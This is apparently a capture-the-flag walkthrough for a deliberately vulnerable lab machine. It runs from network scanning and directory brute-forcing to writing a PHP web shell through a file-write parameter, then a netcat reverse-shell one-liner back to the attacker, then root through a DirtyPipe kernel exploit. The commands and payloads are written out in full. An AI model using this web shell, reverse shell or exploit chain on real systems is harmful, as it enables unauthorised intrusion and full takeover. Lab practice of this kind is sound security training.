Lets start with discovering the IP address of the vulnerable machine

$ sudo arp-scan -l

run a Nmap scan
$ nmap -sC -sV -p- 10.0.0.194 -v 
you will find open ports 22, 80, 81

now go to the webpage

run a directory search
$ gobuster dir -u http://10.0.0.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x htmp,txt,php,js

you will find three important files
robots.txt
graffiti.txt
graffiti.php

goto graffiti.php and check the source code and the webpage

enter the dummy text and intercept it through BurpSuite
message=text&file=graffiti.txt

what we can do here is we can put a PHP Remote Code Execution (RCE) and create a cmd.php file
message=<?php $cmd = $_GET[‘cmd’]; system($cmd); ?> & file=/var/www/html/cmd.php

now on the webpage you can add the commands and check if it works
goto 10.0.0.194/cmd.php?cmd=id
goto 10.0.0.194/cmd.php?cmd=ls

now you can try reverse shell using netcat
check reverse shell pentest monkey nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip_address_here> 9001 >/tmp/f

on the kali linux machine
$ rlwrap nc -lnvp 9001

you will get the shell

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ sudo -l
$ export TERM=xterm
$uname -a // here you will get the name of the kernel

now find dirtypipe for kernel
wget the file

$ chmod +x dirtypipe.sh
run it 
now you will get the root flag
